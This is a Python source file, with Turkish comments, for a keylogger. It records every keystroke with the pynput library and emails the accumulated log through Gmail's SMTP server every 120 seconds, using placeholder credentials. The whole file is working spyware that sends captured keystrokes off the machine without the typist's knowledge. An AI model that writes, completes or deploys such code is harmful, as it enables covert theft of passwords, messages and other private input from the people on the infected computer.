# keylogger.py 

import pynput.keyboard
import threading
import smtplib

class Keylogger:
    # init methodu oluşturduk
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger Started"
        self.interval = time_interval
        self.email = email
        self.password = password
    # logları kaydetmek için bir method oluşturduk
    def append_to_log(self, string):
        self.log = self.log + string
    # logları göndermek için bir method oluşturduk
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)
    # logları göndermek için bir method oluşturduk
    def report(self):
        self.send_mail(self.email, self.password, "\n Log: " + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    # mail göndermek için bir method oluşturduk
    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
    # keylogger'ı başlatmak için bir method oluşturduk
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
    
my_keylogger = Keylogger(120, "email", "password")
my_keylogger.start()

